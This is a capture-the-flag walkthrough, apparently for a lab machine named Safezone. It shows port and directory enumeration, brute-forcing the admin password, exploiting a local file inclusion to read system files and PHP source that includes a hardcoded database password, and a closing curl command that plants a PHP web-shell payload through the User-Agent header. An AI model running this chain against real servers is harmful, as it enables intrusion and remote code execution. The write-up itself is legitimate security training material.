

<br>

<h2 align="center">Port Scanning</h2>



<br>



```bash
:~/challenge# nmap -sC -sV -T4 -Pn -p22,80 safezone.thm
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
...
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Whoami?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.40 seconds
```

<br>
<h2 align="center">Directory and File Enumeration</h2>

```bash
:~/challenge# gobuster dir -u http://safezone.thm/ -w /usr/share/dirb/wordlists/common.txt -t 60 -q -x php,html --exclude-length 277
/dashboard.php        (Status: 302) [Size: 922] [--> index.php]
/detail.php           (Status: 302) [Size: 1103] [--> index.php]
/index.html           (Status: 200) [Size: 503]
/index.html           (Status: 200) [Size: 503]
/index.php            (Status: 200) [Size: 2372]
/index.php            (Status: 200) [Size: 2372]
/logout.php           (Status: 200) [Size: 54]
/news.php             (Status: 302) [Size: 922] [--> index.php]
/register.php         (Status: 200) [Size: 2334]
/test.php             (Status: 200) [Size: 72888]
```

```bash
:~/challenge# gobuster dir -u http://safezone.thm/ -w /usr/share/dirb/wordlists/common.txt -x php,htmls,txt -t 60 -q --exclude-length 277
/dashboard.php        (Status: 302) [Size: 922] [--> index.php]
/detail.php           (Status: 302) [Size: 1103] [--> index.php]
/index.html           (Status: 200) [Size: 503]
/index.php            (Status: 200) [Size: 2372]
/index.php            (Status: 200) [Size: 2372]
/logout.php           (Status: 200) [Size: 54]
/news.php             (Status: 302) [Size: 922] [--> index.php]
/note.txt             (Status: 200) [Size: 121]
/register.php         (Status: 200) [Size: 2334]
/test.php             (Status: 200) [Size: 72888]
```

```bash
:~/challenge# printf "%s\n" {00..99} > list.txt
```

```bash
:~/challenge# apt update && apt install -y python3-pip && pip3 install wfuzz
```

```bash
:~/challenge# pip3 install wfuzz --break-system-packages
```

```bash
:~/challenge# wfuzz --version
```

```bash
:~/challenge# ffuf -w list.txt -d "username=admin&password=adminFUZZadmin&submit=Submit" -X POST -u http://safezone.thm/index.php -t 1 -p 20
...
:~/challenge# wfuzz -c -z range,00-99 -d "username=admin&password=adminFUZZadmin&submit=Submit" -X POST -u http://10.10.X.X/index.php -t 1 -s 20
...
```

```bash
:~/challenge# gobuster dir -u http://safezone.thm/~files/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt -x txt,php -t 60 --exclude-length 278
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://safezone.thm/
[+] Method:                  GET
[+] Threads:                 60
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt
[+] Negative Status codes:   404
[+] Exclude Length:          278
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/register.php         (Status: 200) [Size: 2334]
/logout.php           (Status: 200) [Size: 54]
/news.php             (Status: 302) [Size: 922] [--> index.php]
/test.php             (Status: 200) [Size: 72897]
/index.php            (Status: 200) [Size: 2372]
/dashboard.php        (Status: 302) [Size: 922] [--> index.php]
/detail.php           (Status: 302) [Size: 1103] [--> index.php]
/note.txt             (Status: 200) [Size: 121]
Progress: 67360 / 186828 (36.05%)[ERROR] parse "http://safezone.thm/besalu\t.txt": net/url: invalid control character in URL
[ERROR] parse "http://safezone.thm/besalu\t.php": net/url: invalid control character in URL
Progress: 70087 / 186828 (37.51%)[ERROR] parse "http://safezone.thm/error\x1f_log": net/url: invalid control character in URL
[ERROR] parse "http://safezone.thm/error\x1f_log.txt": net/url: invalid control character in URL
[ERROR] parse "http://safezone.thm/error\x1f_log.php": net/url: invalid control character in URL
/index.php            (Status: 200) [Size: 2372]
/~files               (Status: 301) [Size: 315] [--> http://safezone.thm/~files/]
Progress: 186825 / 186828 (100.00%)
===============================================================
Finished
===============================================================
```

<br>
<p><em>note.txt</em></p>

```bash
:~/challenge# curl http://safezone.thm/note.txt
Message from admin :-

I can't remember my password always , that's why I have saved it in /home/files/pass.txt file .
```

```bash
:~/challenge# pip3 install html2text
```

<br>
<p><em>test.php</em></p>

```bash
:~/challenge# curl http://safezone.thm/test.php | html2text > test.txt
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 72852    0 72852    0     0   197k      0 --:--:-- --:--:-- --:--:--  197k
```

```bash
:~/challenge# grep -i "/var/www/" test.txt
DOCUMENT_ROOT | /var/www/html   
CONTEXT_DOCUMENT_ROOT | /var/www/html   
SCRIPT_FILENAME | /var/www/html/test.php   
$_SERVER['DOCUMENT_ROOT']| /var/www/html  
$_SERVER['CONTEXT_DOCUMENT_ROOT']| /var/www/html  
$_SERVER['SCRIPT_FILENAME']| /var/www/html/test.php  
```

```bash
:~/challenge# grep -i "SERVER" test.txt
Server API | Apache 2.0 Handler   
Server Administrator | webmaster@localhost   
Virtual Server | Yes   
Server Root | /etc/apache2   
SERVER_SIGNATURE | <address>Apache/2.4.41 (Ubuntu) Server at safezone.thm Port 80</address>  
SERVER_SOFTWARE | Apache/2.4.41 (Ubuntu)   
SERVER_NAME | safezone.thm   
SERVER_ADDR | safezone.thm   
SERVER_PORT | 80   
SERVER_ADMIN | webmaster@localhost   
SERVER_PROTOCOL | HTTP/1.1   
Interfaces | OuterIterator, RecursiveIterator, SeekableIterator, SplObserver, SplSubject   
$_SERVER['HTTP_HOST']| safezone.thm  
$_SERVER['HTTP_USER_AGENT']| curl/8.5.0  
$_SERVER['HTTP_ACCEPT']| */*  
$_SERVER['PATH']|
$_SERVER['SERVER_SIGNATURE']| <address>Apache/2.4.41 (Ubuntu) Server at
$_SERVER['SERVER_SOFTWARE']| Apache/2.4.41 (Ubuntu)  
$_SERVER['SERVER_NAME']| safezone.thm  
$_SERVER['SERVER_ADDR']| safezone.thm  
$_SERVER['SERVER_PORT']| 80  
$_SERVER['REMOTE_ADDR']| 10.65.115.1  
$_SERVER['DOCUMENT_ROOT']| /var/www/html  
$_SERVER['REQUEST_SCHEME']| http  
$_SERVER['CONTEXT_PREFIX']| _no value_  
$_SERVER['CONTEXT_DOCUMENT_ROOT']| /var/www/html  
$_SERVER['SERVER_ADMIN']| webmaster@localhost  
$_SERVER['SCRIPT_FILENAME']| /var/www/html/test.php  
$_SERVER['REMOTE_PORT']| 36480  
$_SERVER['GATEWAY_INTERFACE']| CGI/1.1  
$_SERVER['SERVER_PROTOCOL']| HTTP/1.1  
$_SERVER['REQUEST_METHOD']| GET  
$_SERVER['QUERY_STRING']| _no value_  
$_SERVER['REQUEST_URI']| /test.php  
$_SERVER['SCRIPT_NAME']| /test.php  
$_SERVER['PHP_SELF']| /test.php  
$_SERVER['REQUEST_TIME_FLOAT']| 1773602644.143  
$_SERVER['REQUEST_TIME']| 1773602644  
```

<p>

- Navigate to http://safezone.thm/~files/</p>

<img width="1017" height="284" alt="image" src="https://github.com/user-attachments/assets/9589e87b-d618-4ffe-9a27-396bfda5d27e" />

<br>
<br>
<p> 

- Click <code>pass.txt</code></p>

```bash
Admin password hint :-

admin__admin

" __ means two numbers are there , this hint is enough I think :) "
```

<img width="1007" height="168" alt="image" src="https://github.com/user-attachments/assets/ac86a053-44dd-407b-b342-83ae8a3d6c2c" />

<br>
<br>
<p>

- Register:http://safezone.thm/register.php</p>

<img width="996" height="463" alt="image" src="https://github.com/user-attachments/assets/d96daf64-4b6b-4380-830a-d876667136fe" />

<br>
<br>
<p>

- Log in: http://safezone.thm/index.php</p>

<img width="1004" height="278" alt="image" src="https://github.com/user-attachments/assets/592e08ba-c279-4809-9124-2dd4e00407d8" />

<br>
<br>
<p>

- Inspect HTTP history in Burp Suite</p>

<img width="1071" height="404" alt="image" src="https://github.com/user-attachments/assets/3932eaf8-660b-4ff5-9648-3b3d9a32000c" />

<br>
<br>
<p>

- Send Request to Intruder<br>
- Add <code>admin</code> as username<br>
- Add <code>admin&a&admin</code><br>
- Select <code>Simple list</code> as Payload type<br>
- Click <code>Load...</code><br>
- Browse and Open the <code>list.txt</code> created previously<br>
- Click <code>Start attack</code></p>

<img width="1069" height="328" alt="image" src="https://github.com/user-attachments/assets/16d39cd4-e180-4562-b7d0-656f3fefe30d" />

<br>
<br>
<p>

- Check the <strong>Results</strong><br>
- Log out<br>
- Log in as <code>admin</code> and the password just discovered</p>

<img width="999" height="256" alt="image" src="https://github.com/user-attachments/assets/d624bcfc-3f9b-47c6-9c6c-ee6c6acde232" />

<br>
<br>
<p>

- Select <code>Details</code></p>

<img width="1003" height="349" alt="image" src="https://github.com/user-attachments/assets/6742614f-3de5-4d47-ba9d-2828e3387f14" />

<br>
<br>
<p>

- Enter <code>admin</code><br>
- Hit <code>whoami</code><br>
- Check Burp Suite´s HTTP history<br>
- Identify that <code>dashboard.php</code> is active</p>

<img width="1005" height="375" alt="image" src="https://github.com/user-attachments/assets/b301029a-e589-4c94-92a1-6f8f00a8ea25" />

<br>
<br>

<img width="1043" height="273" alt="image" src="https://github.com/user-attachments/assets/c905416f-e888-464a-97ed-d79133db5ab0" />

<br>
<br>
<p>

- http://safezone.thm/detail.php?page=index.html</p>

<img width="1043" height="273" alt="image" src="https://github.com/user-attachments/assets/c905416f-e888-464a-97ed-d79133db5ab0" />

<br>
<br>
<p>

- Navigate to <code>http://safezone.thm/detail.php?page=index.html</code></p>

<img width="1012" height="515" alt="image" src="https://github.com/user-attachments/assets/429a3909-49b6-447a-96a3-8afc4a13d145" />

<br>
<br>
<p>

- Navigate to <code>http://safezone.thm/detail.php?page=/etc/passwd</code><br>
- Discover users <code>root</code>, <code>files</code>, and <code>ubuntu</code></p>

<img width="1120" height="584" alt="image" src="https://github.com/user-attachments/assets/7370f182-2857-4e8a-a8fe-d78f86d54328" />

<br>
<br>
<p><code>Source Code Disclosure</code> through PHP Base64 Filter allowing reading the <code>detail.php</code> file without the server executing them:<br>
  
- Navigate to http://<code>safezone.thm/detail.php?page=php://filter/convert.base64-encode/resource=detail.php</code></p>

<img width="1135" height="362" alt="image" src="https://github.com/user-attachments/assets/b4b6ee2d-8ecf-49a3-b2a7-ad3f153fbe95" />

<br>
<br>
<p>

- Decode the output via <code>CyberChef</code></p>

```bash
php://filter/convert.base64-encode/resource=detail.phpPCFET0NUWVBFIGh0bWw+DQo8aHRtbD4NCjxoZWFkPg0KDQo8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9InN0eWxlLmNzcyI+DQoNCjx0aXRsZT5VU0VSPC90aXRsZT4NCjxzdHlsZT4NCg0KLmF2YXRhciB7DQogICBtYXJnaW4tbGVmdDoxMHB4Ow0KICAgbWFyZ2luLXRvcDo4MHB4Ow0KICAgdmVydGljYWwtYWxpZ246IG1pZGRsZTsNCiAgIHdpZHRoOiA1MHB4Ow0KICAgaGVpZ2h0OiA1MHB4Ow0KICAgYm9yZGVyLXJhZGl1czogNTAlOw0KICAgYm9yZGVyOjNweCBzb2xpZCBibGFjazsNCn0NCnVsIHsNCiAgbGlzdC1zdHlsZS10eXBlOiBub25lOw0KICBtYXJnaW46IDA7DQogIHBhZGRpbmc6IDA7DQogIG92ZXJmbG93OiBoaWRkZW47DQogIGJhY2tncm91bmQtY29sb3I6ICMzMzM7DQp9DQoNCmxpIHsNCiAgZmxvYXQ6IGxlZnQ7DQp9DQoNCmxpIGEgew0KICBkaXNwbGF5OiBibG9jazsNCiAgY29sb3I6IHdoaXRlOw0KICB0ZXh0LWFsaWduOiBjZW50ZXI7DQogIHBhZGRpbmc6IDE0cHggMTZweDsNCiAgdGV4dC1kZWNvcmF0aW9uOiBub25lOw0KfQ0KDQpsaSBhOmhvdmVyIHsNCiAgYmFja2dyb3VuZC1jb2xvcjogIzExMTsNCg0KDQp9DQo8L3N0eWxlPg0KDQo8L2hlYWQ+DQo8Ym9keSBzdHlsZT0iYmFja2dyb3VuZC1jb2xvcjpibGFjayI+DQo8dWw+DQogIDxsaT48YSBjbGFzcz0iYWN0aXZlIiBocmVmPSJkYXNoYm9hcmQucGhwIj5Ib21lPC9hPjwvbGk+DQogIDxsaT48YSBocmVmPSJuZXdzLnBocCI+TmV3czwvYT48L2xpPg0KICA8bGk+PGEgaHJlZj0iY29udGFjdC5waHAiPkNvbnRhY3Q8L2E+PC9saT4NCiAgPGxpPjxhIGhyZWY9ImRldGFpbC5waHAiPkRldGFpbHM8L2E+PC9saT4NCiAgPGxpPjxhIGhyZWY9ImxvZ291dC5waHAiPkxvZ291dDwvYT48L2xpPg0KPC91bD4NCg0KDQo8YnI+PGJyPjxicj48YnI+PGJyPg0KPC9ib2R5Pg0KDQoNCg0KDQoNCg0KDQoNCg0KDQoNCg0KDQoNCg0KDQoNCg0KDQoNCg0KDQoNCg0KDQoNCg0KDQoNCg0KDQoNCg0KDQoNCg0KDQoNCg0KDQoNCg0KDQoNCg0KDQoNCg0KDQoNCg0KDQoNCg0KDQoNCjwhLS0gdHJ5IHRvIHVzZSAicGFnZSIgYXMgR0VUIHBhcmFtZXRlci0tPg0KPC9odG1sPg0KDQo8P3BocA0KJGNvbj1teXNxbGlfY29ubmVjdCgibG9jYWxob3N0Iiwicm9vdCIsIm15cm9vdHBhc3MiLCJkYiIpOw0Kc2Vzc2lvbl9zdGFydCgpOw0KaWYoaXNzZXQoJF9TRVNTSU9OWydJU19MT0dJTiddKSkNCnsNCiRpc19hZG1pbj0kX1NFU1NJT05bJ2lzYWRtaW4nXTsNCmVjaG8gIjxoMiBzdHlsZT0nY29sb3I6VG9tYXRvO21hcmdpbi1sZWZ0OjEwMHB4O21hcmdpbi10b3A6LTgwcHgnPkZpbmQgb3V0IHdobyB5b3UgYXJlIDopIDwvaDI+IjsNCmVjaG8gIjxicj48YnI+PGJyPiI7DQppZigkaXNfYWRtaW49PT0idHJ1ZSIpDQp7DQplY2hvICc8ZGl2IHN0eWxlPSJhbGlnbjpjZW50ZXI7IiBjbGFzcz0iZGl2ZiI+JzsNCmVjaG8gJzxmb3JtIGNsYXNzPSJib3giIG1ldGhvZD0iUE9TVCIgc3R5bGU9InRleHQtYWxpZ246Y2VudGVyIj4nOw0KZWNobyAnPGlucHV0IHJlcXVpcmVkIEFVVE9DT01QTEVURT0iT0ZGIiBzdHlsZT0idGV4dC1hbGlnbjpjZW50ZXI7IiB0eXBlPSJ0ZXh0IiBwbGFjZWhvbGRlcj0idXNlciIgbmFtZT0ibmFtZSI+PGJyPjxicj4nOw0KZWNobyAnPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9Indob2FtaSIgbmFtZT0ic3ViIj4nOw0KZWNobyAnPC9mb3JtPic7DQplY2hvICc8L2Rpdj4nOw0KaWYoaXNzZXQoJF9HRVRbInBhZ2UiXSkpDQp7DQoJCSRwYWdlPSRfR0VUWyJwYWdlIl07DQoJCSRmaWxlID0gc3RyX3JlcGxhY2UoYXJyYXkoICIuLi8iLCAiLi5cIiIgKSwgIiIsICRwYWdlICk7DQoJCWVjaG8gJGZpbGU7DQoJCWluY2x1ZGUoJGZpbGUpOw0KfQ0KJGZvcm11c2VyPW15c3FsaV9yZWFsX2VzY2FwZV9zdHJpbmcoJGNvbiwkX1BPU1RbJ25hbWUnXSk7DQppZihpc3NldCgkX1BPU1RbJ3N1YiddKSkNCgl7DQoJCSRzcWw9InNlbGVjdCAqIGZyb20gdXNlciB3aGVyZSB1c2VybmFtZT0nJGZvcm11c2VyJyI7DQogICAgICAgICAgICAgICAgJGRldGFpbHMgPSBteXNxbGlfZmV0Y2hfYXNzb2MobXlzcWxpX3F1ZXJ5KCRjb24sJHNxbCkpOw0KCQkkZGV0PWpzb25fZW5jb2RlKCRkZXRhaWxzKTsNCgkJZWNobyAiPHByZSBzdHlsZT0nY29sb3I6cmVkO2ZvbnQtc2l6ZToxNHB4Jz4kZGV0PC9wcmU+IjsNCgkJJG1zZz0iRGV0YWlscyBhcmUgc2F2ZWQgaW4gYSBmaWxlIjsNCgkJZWNobyAiPHNjcmlwdD5hbGVydCgnZGV0YWlscyBzYXZlZCBpbiBhIGZpbGUnKTwvc2NyaXB0PiI7DQoJfQ0KfQ0KZWxzZQ0Kew0KZWNobyAiPGgzIHN0eWxlPSdjb2xvcjpyZWQ7dGV4dC1hbGlnbjpjZW50ZXInPllvdSBjYW4ndCBhY2Nlc3MgdGhpcyBmZWF0dXJlISc8L2gzPiI7DQp9DQp9DQplbHNlDQp7DQpoZWFkZXIoJ0xvY2F0aW9uOiBpbmRleC5waHAnKTsNCn0NCg0KPz4NCg==
```

<img width="1905" height="879" alt="image" src="https://github.com/user-attachments/assets/2206fa32-6e48-40e4-969b-48a20f0c0d28" />

<br>
<br>
<p>

- Note that the message <code>details saved in a file</code> is provided for some inputs you submit<br>
- The files are NOT saved anywhere.</p>

```bash
<?php
$con=mysqli_connect("localhost","root","myrootpass","db");
session_start();
if(isset($_SESSION['IS_LOGIN']))
{
$is_admin=$_SESSION['isadmin'];
echo "<h2 style='color:Tomato;margin-left:100px;margin-top:-80px'>Find out who you are :) </h2>";
echo "<br><br><br>";
if($is_admin==="true")
{
echo '<div style="align:center;" class="divf">';
echo '<form class="box" method="POST" style="text-align:center">';
echo '<input required AUTOCOMPLETE="OFF" style="text-align:center;" type="text" placeholder="user" name="name"><br><br>';
echo '<input type="submit" value="whoami" name="sub">';
echo '</form>';
echo '</div>';
if(isset($_GET["page"]))
{
		$page=$_GET["page"];
		$file = str_replace(array( "../", "..\"" ), "", $page );
		echo $file;
		include($file);
}
$formuser=mysqli_real_escape_string($con,$_POST['name']);
if(isset($_POST['sub']))
	{
		$sql="select * from user where username='$formuser'";
                $details = mysqli_fetch_assoc(mysqli_query($con,$sql));
		$det=json_encode($details);
		echo "<pre style='color:red;font-size:14px'>$det</pre>";
		$msg="Details are saved in a file";
		echo "<script>alert('details saved in a file')</script>";
	}
}
else
{
echo "<h3 style='color:red;text-align:center'>You can't access this feature!'</h3>";
}
}
else
{
header('Location: index.php');
}

?>
```

<p>

- Inspect carefully the excerpt below and note that there is the vulnerability.<br>
- Since it contains <code>"../"</code> and <code>"..\"</code> it is NOT feasible to traverse directories.<br>
- Despite that there is <code>include($file);</code> meaning that you CAN execute whatever code is inside the file you point it to.</p>

```bash
if(isset($_GET["page"]))
{
		$page=$_GET["page"];
		$file = str_replace(array( "../", "..\"" ), "", $page );
		echo $file;
		include($file);
}
```

<p>

- Try to read <code>access.log</code> (http://target.thm/detail.php?page=/var/log/apache2/access.log) and note that it will not be effective.<br>
- It will just provide <code>=/var/log/apache2/access.log</code> in Burp Suite´s response.</p>


<br>
<p><code></code>Session Poisoning</code>:<br>

- Since we can't read the Apache logs, try to infect a file that <code>www-data</code> does have permission to read.<br>
- Find your Session ID (YOUR_SESSION_IDE) looking at your Burp Suite request for your PHPSESSID cookie (e.g., 6brpgikvnrk6e6na5vcqm7iea7).<br>
- Find the Session File. PHP usually stores these in /var/lib/php/sessions/sess_(YOUR_SESSION_ID).
- Test the LFI: Go to your browser and try to include your session file: http://safezone.thm/detail.php?page=/var/lib/php/sessions/sess_6brpgikvnrk6e6na5vcqm7iea7</p>


```bash
http://target.thm/detail.php?page=/var/log/apache2/access.log
```

```bash
http://safezone.thm/detail.php?page=php://filter/convert.base64-encode/resource=/var/log/apache2/access.log
```





```bash
:~/challenge# curl -A '<?php echo exec($_GET[cmd]) ; ?>' http://safezone.thm
<html>
<title>Whoami?</title>

<body style="background-color:black">
<pre style="color:#737CA1;font-size:14px">

   _____       ____                          

  / ___/____ _/ __/__  ____  ____  ____  ___ 

  \__ \/ __ `/ /_/ _ \/_  / / __ \/ __ \/ _ \

___/ / /_/ / __/  __/ / /_/ /_/ / / / /  __/

/____/\__,_/_/  \___/ /___/\____/_/ /_/\___/ 

                                            Designed by cyberbot :)


</pre>



</body>








```
